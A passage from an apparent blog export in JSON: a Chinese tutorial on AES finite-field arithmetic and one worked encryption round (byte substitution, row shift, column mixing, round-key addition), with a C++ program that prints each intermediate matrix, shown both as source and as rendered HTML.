 }\n \n    //行移位\n    for(int i=0;i<=3;i++)\n        for(int j=0;j<=3;j++)\n            b[i][j] = a[i][(i+j)%4];\n \n    cout<<\"行移位后的矩阵为：\"<<endl;\n    for(int i=0;i<=3;i++) {\n        for(int j=0;j<=3;j++) {\n            cout<<hex<<b[i][j]<<'\\t';\n        }\n        cout<<endl;\n    }\n \n    //列混淆\n    for(int i=0;i<=3;i++) {\n        for(int j=0;j<=3;j++) {\n            for(int k=0;k<=3;k++) {\n                resMix[i][j] ^= mul_mat(mixCol[i][k],b[k][j]);\n            }\n        }\n    }\n    cout<<\"列混淆后的矩阵为：\"<<endl;\n    for(int i=0;i<=3;i++) {\n        for(int j=0;j<=3;j++) {\n            cout<<hex<<resMix[i][j]<<'\\t';\n        }\n        cout<<endl;\n    }\n \n    //轮密钥加\n    for(int i=0;i<=3;i++) {\n        for(int j=0;j<=3;j++) {\n            res[j][i] = resMix[j][i] ^ round_key[j][i];\n        }\n    }\n    cout<<\"轮密钥加后的矩阵为：\"<<endl;\n    for(int i=0;i<=3;i++) {\n        for(int j=0;j<=3;j++) {\n            cout<<hex<<res[i][j]<<'\\t';\n        }\n        cout<<endl;\n    }\n}\n```\n\n\n","slug":"AES","published":1,"updated":"2020-11-04T13:03:20.000Z","_id":"clg29vygw002oao9c1i097o52","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"AES数学基础\"><a href=\"#AES数学基础\" class=\"headerlink\" title=\"AES数学基础\"></a><code>AES数学基础</code></h1><h2 id=\"1-有限域GF-2-8\"><a href=\"#1-有限域GF-2-8\" class=\"headerlink\" title=\"1.有限域GF(2^8)\"></a>1.有限域GF(2^8)</h2><p>AES以字节为单位进行计算，一个字节8bit。</p>\n<p>多项式表示法：01010111———&gt;x^6+x^4+x^2+x^1+x^0</p>\n<h2 id=\"2-算法的基本运算\"><a href=\"#2-算法的基本运算\" class=\"headerlink\" title=\"2.算法的基本运算\"></a>2.算法的基本运算</h2><h3 id=\"（1）加法、减法\"><a href=\"#（1）加法、减法\" class=\"headerlink\" title=\"（1）加法、减法\"></a>（1）加法、减法</h3><p>​    <strong>异或运算：01010111+10000011=11010100</strong></p>\n<h3 id=\"（2）乘法\"><a href=\"#（2）乘法\" class=\"headerlink\" title=\"（2）乘法\"></a>（2）乘法</h3><p>​    要计算有限域GF（2^8）上的乘法，需要确定一个GF(2)上的8次不可约多项式(除了1和自身没有任何其他因子)。</p>\n<p>​    对于AES，这个不可约多项式确定为：m(x)=x^8+x^4+x^3+x^1+x^0 (二进制表示：0000000100011011)</p>\n<p>​    在AES乘法中，需要将两数积mod m(x)。</p>\n<p>​    <strong>例：01010111*10000011=11000001</strong></p>\n<h3 id=\"（3）X乘运算\"><a href=\"#（3）X乘运算\" class=\"headerlink\" title=\"（3）X乘运算\"></a>（3）X乘运算</h3><pre><code class=\"hljs\"> xtime()算法可用于面向字节的乘法运算。\n</code></pre>\n<p>​    根据定义，xtime()运算是最高项指数不大于7的多项式b(x)乘以多项式x的乘法运算</p>\n<p>​    例：b(x)=b7x7+b6x6+b5x5+b4x4+b3x3+b2x2+b1x+b0<br>​    xtime(b(x))=x·b(x)=(b7x8+b6x7+b5x6+b4x5+b3x4+b2x3+b1x2+b0x )mod m(x)<br>​    =(b7x8+b6x7+b5x6+b4x5+b3x4+b2x3+b1x2+b0x )mod (x8+x4+x3+x+1)</p>\n<p>分类讨论：</p>\n<p>（1）当b7=0：</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20201104210055963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>（2）当b7=1：<br><img src=\"https://img-blog.csdnimg.cn/20201104210107640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"AES算法描述\"><a href=\"#AES算法描述\" class=\"headerlink\" title=\"AES算法描述\"></a>AES算法描述</h1><h2 id=\"1-概述\"><a href=\"#1-概述\" class=\"headerlink\" title=\"1.概述\"></a>1.概述</h2><p>​    分组长度：128bit        密钥长度：128bit、192bit、256bit（密钥长度不同，加密轮数不同）</p>\n<p>​    基于Rijndael算法。</p>\n<h2 id=\"2-算法原理\"><a href=\"#2-算法原理\" class=\"headerlink\" title=\"2.算法原理\"></a>2.算法原理</h2><p>​    <strong>例：</strong></p>\n<p>​    已知：一轮输入状态矩阵：</p>\n<p>​    <strong>EA 04 65 85</strong></p>\n<p>​     <strong>83 45 5D 96</strong>  </p>\n<pre><code class=\"hljs\"> **5C 33 98 B0**\n</code></pre>\n<p>​     <strong>F0 2D AD C5</strong></p>\n<h3 id=\"（1）字节代换：关于字节的非线性变换（利用S盒）。\"><a href=\"#（1）字节代换：关于字节的非线性变换（利用S盒）。\" class=\"headerlink\" title=\"（1）字节代换：关于字节的非线性变换（利用S盒）。\"></a>（1）字节代换：关于字节的非线性变换（利用S盒）。</h3><p><img src=\"https://img-blog.csdnimg.cn/20201104210124399.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>代换结果：</p>\n<p><strong>87 F2 4D 97<br>EC 6E 4C 90<br>4A C3  46  E7<br>8C D8 95  A6</strong></p>\n<h3 id=\"（2）行位移：将状态矩阵各行进行循环位移\"><a href=\"#（2）行位移：将状态矩阵各行进行循环位移\" class=\"headerlink\" title=\"（2）行位移：将状态矩阵各行进行循环位移\"></a>（2）行位移：将状态矩阵各行进行循环位移</h3><p>​    第一行保持不变，第二行循环左移8bit，第三行循环左移16bit，第四行循环左移24bit</p>\n<p>位移结果：</p>\n<p><strong>87    f2    4d    97<br>6e    4c    90    ec       （左1）<br>46    e7    4a    c3        （左2）<br>a6    8c    d8    95</strong>        （左3）</p>\n<h3 id=\"（3）列混淆：将状态矩阵右乘列混淆矩阵，这个过程称为列混淆\"><a href=\"#（3）列混淆：将状态矩阵右乘列混淆矩阵，这个过程称为列混淆\" class=\"headerlink\" title=\"（3）列混淆：将状态矩阵右乘列混淆矩阵，这个过程称为列混淆\"></a>（3）列混淆：将状态矩阵<strong>右乘</strong>列混淆矩阵，这个过程称为列混淆</h3><p>混淆矩阵：<br><img src=\"https://img-blog.csdnimg.cn/20201104210138340.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p><img src=\"https://img-blog.csdnimg.cn/20201104210149908.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>混淆结果：</p>\n<p><strong>47    40    a3    4c<br>37    d4    70    9f<br>94    e4    3a    42<br>ed    a5    a6    bc</strong></p>\n<h3 id=\"（4）轮密钥加：用轮密钥矩阵的第-i-列，与上面得到的列混淆矩阵的第-i-列进行异或运算，得到最后的矩阵。\"><a href=\"#（4）轮密钥加：用轮密钥矩阵的第-i-列，与上面得到的列混淆矩阵的第-i-列进行异或运算，得到最后的矩阵。\" class=\"headerlink\" title=\"（4）轮密钥加：用轮密钥矩阵的第 i 列，与上面得到的列混淆矩阵的第 i 列进行异或运算，得到最后的矩阵。\"></a>（4）轮密钥加：用轮密钥矩阵的第 i 列，与上面得到的列混淆矩阵的第 i 列进行异或运算，得到最后的矩阵。</h3><h3 id=\"3-代码实现（C语言）\"><a href=\"#3-代码实现（C语言）\" class=\"headerlink\" title=\"3.代码实现（C语言）\"></a>3.代码实现（C语言）</h3><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs cpp\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span><span class=\"hljs-string\">&lt;iostream&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span><span class=\"hljs-string\">&lt;cstdio&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span><span class=\"hljs-string\">&lt;cstring&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span><span class=\"hljs-string\">&lt;algorithm&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span><span class=\"hljs-string\">&lt;bitset&gt;</span></span><br><span class=\"hljs-keyword\">using</span> <span class=\"hljs-keyword\">namespace</span> std;<br> <br><span class=\"hljs-type\">int</span> a[<span class=\"hljs-number\">4</span>][<span class=\"hljs-number\">4</span>] = &#123;<br>    &#123;<span class=\"hljs-number\">0x87</span>, <span class=\"hljs-number\">0xF2</span>, <span class=\"hljs-number\">0x4D</span>, <span class=\"hljs-number\">0x97</span>&#125;,<br>    &#123;<span class=\"hljs-number\">0xEC</span>, <span class=\"hljs-number\">0x6E</span>, <span class=\"hljs-number\">0x4C</span>, <span class=\"hljs-number\">0x90</span>&#125;,<br>    &#123;<span class=\"hljs-number\">0x4A</span>, <span class=\"hljs-number\">0xC3</span>, <span class=\"hljs-number\">0x46</span>, <span class=\"hljs-number\">0xE7</span>&#125;,<br>    &#123;<span class=\"hljs-number\">0x8C</span>, <span class=\"hljs-number\">0xD8</span>, <span class=\"hljs-number\">0x95</span>, <span class=\"hljs-number\">0xA6</span>&#125;<br>&#125;;<span class=\"hljs-comment\">//字节代换后的矩阵</span><br><span class=\"hljs-type\">int</span> mixCol[<span class=\"hljs-number\">4</span>][<span class=\"hljs-number\">4</span>] = &#123;<br>    &#123;<span class=\"hljs-number\">0x02</span>, <span class=\"hljs-number\">0x03</span>, <span class=\"hljs-number\">0x01</span>, <span class=\"hljs-number\">0x01</span>&#125;,<br>    &#123;<span class=\"hljs-number\">0x01</span>, <span class=\"hljs-number\">0x02</span>, <span class=\"hljs-number\">0x03</span>, <span class=\"hljs-number\">0x01</span>&#125;,<br>    &#123;<span class=\"hljs-number\">0x01</span>, <span class=\"hljs-number\">0x01</span>, <span class=\"hljs-number\">0x02</span>, <span class=\"hljs-number\">0x03</span>&#125;,<br>    &#123;<span class=\"hljs-number\">0x03</span>, <span class=\"hljs-number\">0x01</span>, <span class=\"hljs-number\">0x01</span>, <span class=\"hljs-number\">0x02</span>&#125;<br>&#125;;<span class=\"hljs-comment\">//列混淆矩阵</span><br><span class=\"hljs-type\">int</span> round_key[<span class=\"hljs-number\">4</span>][<span class=\"hljs-number\">4</span>] = &#123;<br>    &#123;<span class=\"hljs-number\">0xAC</span>, <span class=\"hljs-number\">0x19</span>, <span class=\"hljs-number\">0x28</span>, <span class=\"hljs-number\">0x57</span>&#125;,<br>    &#123;<span class=\"hljs-number\">0x77</span>, <span class=\"hljs-number\">0xFA</span>, <span class=\"hljs-number\">0xD1</span>, <span class=\"hljs-number\">0x5C</span>&#125;,<br>    &#123;<span class=\"hljs-number\">0x66</span>, <span class=\"hljs-number\">0xDC</span>, <span class=\"hljs-number\">0x29</span>, <span class=\"hljs-number\">0x00</span>&#125;,<br>    &#123;<span class=\"hljs-number\">0xF3</span>, <span class=\"hljs-number\">0x21</span>, <span class=\"hljs-number\">0x41</span>, <span class=\"hljs-number\">0x6A</span>&#125;,<br>&#125;;<span class=\"hljs-comment\">//轮密钥矩阵</span><br> <br><span class=\"hljs-type\">int</span> b[<span class=\"hljs-number\">4</span>][<span class=\"hljs-number\">4</span>];<span class=\"hljs-comment\">//行移位后的矩阵</span><br><span class=\"hljs-type\">int</span> resMix[<span class=\"hljs-number\">4</span>][<span class=\"hljs-number\">4</span>];<span class=\"hljs-comment\">//列混淆后的矩阵</span><br><span class=\"hljs-type\">int</span> res[<span class=\"hljs-number\">4</span>][<span class=\"hljs-number\">4</span>];<span class=\"hljs-comment\">//轮密钥加后的矩阵</span><br> <br><span class=\"hljs-function\"><span class=\"hljs-type\">int</span> <span class=\"hljs-title\">mul_mat</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> x,<span class=\"hljs-type\">int</span> y)</span> </span>&#123;<br>    <span class=\"hljs-keyword\">if</span>(x == <span class=\"hljs-number\">0x01</span>) &#123;<br>        <span class=\"hljs-keyword\">return</span> y;<br>    &#125;<br>    <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(x == <span class=\"hljs-number\">0x02</span>) &#123;<br>        <span class=\"hljs-keyword\">if</span>((y&amp;<span class=\"hljs-number\">128</span>) != <span class=\"hljs-number\">128</span>) &#123; <span class=\"hljs-comment\">//二进制首位为0</span><br>            <span class=\"hljs-keyword\">return</span> y&lt;&lt;<span class=\"hljs-number\">1</span>;<br>        &#125;<br>        <span class=\"hljs-keyword\">else</span> &#123;<br>            <span class=\"hljs-type\">int</span> temp = ((y&lt;&lt;<span class=\"hljs-number\">1</span>)&amp;((<span class=\"hljs-number\">1</span>&lt;&lt;<span class=\"hljs-number\">8</span>)<span class=\"hljs-number\">-1</span>)); <span class=\"hljs-comment\">//向左移一位，删掉最高位(保留8位)</span><br>            <span class=\"hljs-keyword\">return</span> temp^(<span class=\"hljs-number\">0x1b</span>);<br>        &#125;<br>    &#125;<br>    <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(x == <span class=\"hljs-number\">0x03</span>) &#123;<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">mul_mat</span>(<span class=\"hljs-number\">0x02</span>,y)^y;<br>    &#125;<br>&#125;<br> <br> <br><span class=\"hljs-function\"><span class=\"hljs-type\">int</span> <span class=\"hljs-title\">main</span><span class=\"hljs-params\">()</span> </span>&#123;<br> <br>    cout&lt;&lt;<span class=\"hljs-string\">&quot;字节代换后的矩阵为：&quot;</span>&lt;&lt;endl;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;=<span class=\"hljs-number\">3</span>;i++) &#123;<br>        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> j=<span class=\"hljs-number\">0</span>;j&lt;=<span class=\"hljs-number\">3</span>;j++) &#123;<br>            cout&lt;&lt;hex&lt;&lt;a[i][j]&lt;&lt;<span class=\"hljs-string\">&#x27;\\t&#x27;</span>;<br>        &#125;<br>        cout&lt;&lt;endl;<br>    &#125;<br> <br>    <span class=\"hljs-comment\">//行移位</span><br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;=<span class=\"hljs-number\">3</span>;i++)<br>        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> j=<span class=\"hljs-number\">0</span>;j&lt;=<span class=\"hljs-number\">3</span>;j++)<br>            b[i][j] = a[i][(i+j)%<span class=\"hljs-number\">4</span>];<br> <br>    cout&lt;&lt;<span class=\"hljs-string\">&quot;行移位后的矩阵为：&quot;</span>&lt;&lt;endl;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;=<span class=\"hljs-number\">3</span>;i++) &#123;<br>        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> j=<span class=\"hljs-number\">0</span>;j&lt;=<span class=\"hljs-number\">3</span>;j++) &#123;<br>            cout&lt;&lt;hex&lt;&lt;b[i][j]&lt;&lt;<span class=\"hljs-string\">&#x27;\\t&#x27;</span>;<br>        &#125;<br>        cout&lt;&lt;endl;<br>    &#125;<br> <br>    <span class=\"hljs-comment\">//列混淆</span><br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;=<span class=\"hljs-number\">3</span>;i++) &#123;<br>        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> j=<span class=\"hljs-number\">0</span>;j&lt;=<span class=\"hljs-number\">3</span>;j++) &#123;<br>            <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> k=<span class=\"hljs-number\">0</span>;k&lt;=<span class=\"hljs-number\">3</span>;k++) &#123;<br>                resMix[i][j] ^= <span class=\"hljs-built_in\">mul_mat</span>(mixCol[i][k],b[k][j]);<br>            &#125;<br>        &#125;<br>    &#125;<br>    cout&lt;&lt;<span class=\"hljs-string\">&quot;列混淆后的矩阵为：&quot;</span>&lt;&lt;endl;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;=<span class=\"hljs-number\">3</span>;i++) &#123;<br>        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> j=<span class=\"hljs-number\">0</span>;j&lt;=<span class=\"hljs-number\">3</span>;j++) &#123;<br>            cout&lt;&lt;hex&lt;&lt;resMix[i][j]&lt;&lt;<span class=\"hljs-string\">&#x27;\\t&#x27;</span>;<br>        &#125;<br>        cout&lt;&lt;endl;<br>    &#125;<br> <br>    <span class=\"hljs-comment\">//轮密钥加</span><br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;=<span class=\"hljs-number\">3</span>;i++) &#123;<br>        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> j=<span class=\"hljs-number\">0</span>;j&lt;=<span class=\"hljs-number\">3</span>;j++) &#123;<br>            res[j][i] = resMix[j][i] ^ round_key[j][i];<br>        &#125;<br>    &#125;<br>    cout&lt;&lt;<span class=\"hljs-string\">&quot;轮密钥加后的矩阵为：&quot;</span>&lt;&lt;endl;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;=<span class=\"hljs-number\">3</span>;i++) &#123;<br>        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> j=<span class=\"hljs-number\">0</span>;j&lt;=<span class=\"hljs-number\">3</span>;j++) &#123;<br>            cout&lt;&lt;hex&lt;&lt;res[i][j]&lt;&lt;<span class=\"hljs-string\">&#x27;\\t&#x27;</span>;<br>        &#125;<br>        cout&lt;&lt;endl;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"AES数学基础\"><a href=\"#AES数学基础\" class=\"headerlink\" title=\"AES数学基础\"></a><code>AES数学基础</code></h1><h2 id=\"1-有限域GF-2-8\"><a href=\"#1-有限域GF-2-8\" class=\"headerlink\" title=\"1.有限域GF(2^8)\"></a>1.有限域GF(2^8)</h2><p>AES以字节为单位进行计算，一个字节8bit。</p>\n<p>多项式表示法：01010111———&gt;x^6+x^4+x^2+x^1+x^0</p>\n<h2 id=\"2-算法的基本运算\"><a href=\"#2-算法的基本运算\" class=\"headerlink\" title=\"2.算法的基本运算\"></a>2.算法的基本运算</h2><h3 id=\"（1）加法、减法\"><a href=\"#（1）加法、减法\" class=\"headerlink\" title=\"（1）加法、减法\"></a>（1）加法、减法</h3><p>​    <strong>异或运算：01010111+10000011=11010100</strong></p>\n<h3 id=\"（2）乘法\"><a href=\"#（2）乘法\" class=\"headerlink\" title=\"（2）乘法\"></a>（2）乘法</h3><p>​    要计算有限域GF（2^8）上的乘法，需要确定一个GF(2)上的8次不可约多项式(除了1和自身没有任何其他因子)。</p>\n<p>​    对于AES，这个不可约多项式确定为：m(x)=x^8+x^4+x^3+x^1+x^0 (二进制表示：0000000100011011)</p>\n<p>​    在AES乘法中，需要将两数积mod m(x)。</p>\n<p>​    <strong>例：01010111*10000011=11000001</strong></p>\n<h3 id=\"（3）X乘运算\"><a href=\"#（3）X乘运算\" class=\"headerlink\" title=\"（3）X乘运算\"></a>（3）X乘运算</h3><pre><code> xtime()算法可用于面向字节的乘法运算。\n</code></pre>\n<p>​    根据定义，xtime()运算是最高项指数不大于7的多项式b(x)乘以多项式x的乘法运算</p>\n<p>​    例：b(x)=b7x7+b6x6+b5x5+b4x4+b3x3+b2x2+b1x+b0<br>​    xtime(b(x))=x·b(x)=(b7x8+b6x7+b5x6+b4x5+b3x4+b2x3+b1x2+b0x )mod m(x)<br>​    =(b7x8+b6x7+b5x6+b4x5+b3x4+b2x3+b1x2+b0x )mod (x8+x4+x3+x+1)</p>\n<p>分类讨论：</p>\n<p>（1）当b7=0：</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20201104210055963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>（2）当b7=1：<br><img src=\"https://img-blog.csdnimg.cn/20201104210107640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"AES算法描述\"><a href=\"#AES算法描述\" class=\"headerlink\" title=\"AES算法描述\"></a>AES算法描述</h1><h2 id=\"1-概述\"><a href=\"#1-概述\" class=\"headerlink\" title=\"1.概述\"></a>1.概述</h2><p>​    分组长度：128bit        密钥长度：128bit、192bit、256bit（密钥长度不同，加密轮数不同）</p>\n<p>​    基于Rijndael算法。</p>\n<h2 id=\"2-算法原理\"><a href=\"#2-算法原理\" class=\"headerlink\" title=\"2.算法原理\"></a>2.算法原理</h2><p>​    <strong>例：</strong></p>\n<p>​    已知：一轮输入状态矩阵：</p>\n<p>​    <strong>EA 04 65 85</strong></p>\n<p>​     <strong>83 45 5D 96</strong>  </p>\n<pre><code> **5C 33 98 B0**\n</code></pre>\n<p>​     <strong>F0 2D AD C5</strong></p>\n<h3 id=\"（1）字节代换：关于字节的非线性变换（利用S盒）。\"><a href=\"#（1）字节代换：关于字节的非线性变换（利用S盒）。\" class=\"headerlink\" title=\"（1）字节代换：关于字节的非线性变换（利用S盒）。\"></a>（1）字节代换：关于字节的非线性变换（利用S盒）。</h3><p><img src=\"https://img-blog.csdnimg.cn/20201104210124399.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>代换结果：</p>\n<p><strong>87 F2 4D 97<br>EC 6E 4C 90<br>4A C3  46  E7<br>8C D8 95  A6</strong></p>\n<h3 id=\"（2）行位移：将状态矩阵各行进行循环位移\"><a href=\"#（2）行位移：将状态矩阵各行进行循环位移\" class=\"headerlink\" title=\"（2）行位移：将状态矩阵各行进行循环位移\"></a>（2）行位移：将状态矩阵各行进行循环位移</h3><p>​    第一行保持不变，第二行循环左移8bit，第三行循环左移16bit，第四行循环左移24bit</p>\n<p>位移结果：</p>\n<p><strong>87    f2    4d    97<br>6e    4c    90    ec       （左1）<br>46    e7    4a    c3        （左2）<br>a6    8c    d8    95</strong>        （左3）</p>\n<h3 id=\"（3）列混淆：将状态矩阵右乘列混淆矩阵，这个过程称为列混淆\"><a href=\"#（3）列混淆：将状态矩阵右乘列混淆矩阵，这个过程称为列混淆\" class=\"headerlink\" title=\"（3）列混淆：将状态矩阵右乘列混淆矩阵，这个过程称为列混淆\"></a>（3）列混淆：将状态矩阵<strong>右乘</strong>列混淆矩阵，这个过程称为列混淆</h3><p>混淆矩阵：<br><img src=\"https://img-blog.csdnimg.cn/20201104210138340.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p><img src=\"https://img-blog.csdnimg.cn/20201104210149908.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>混淆结果：</p>\n<p><strong>47    40    a3    4c<br>37    d4    70    9f<br>94    e4    3a    42<br>ed    a5    a6    bc</strong></p>\n<h3 id=\"（4）轮密钥加：用轮密钥矩阵的第-i-列，与上面得到的列混淆矩阵的第-i-列进行异或运算，得到最后的矩阵。\"><a href=\"#（4）轮密钥加：用轮密钥矩阵的第-i-列，与上面得到的列混淆矩阵的第-i-列进行异或运算，得到最后的矩阵。\" class=\"headerlink\" title=\"（4）轮密钥加：用轮密钥矩阵的第 i 列，与上面得到的列混淆矩阵的第 i 列进行异或运算，得到最后的矩阵。\"></a>（4）轮密钥加：用轮密钥矩阵的第 i 列，与上面得到的列混淆矩阵的第 i 列进行异或运算，得到最后的矩阵。</h3><h3 id=\"3-代码实现（C语言）\"><a href=\"#3-代码实现（C语言）\" class=\"headerlink\" title=\"3.代码实现（C语言）\"></a>3.代码实现（C语言）</h3><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span 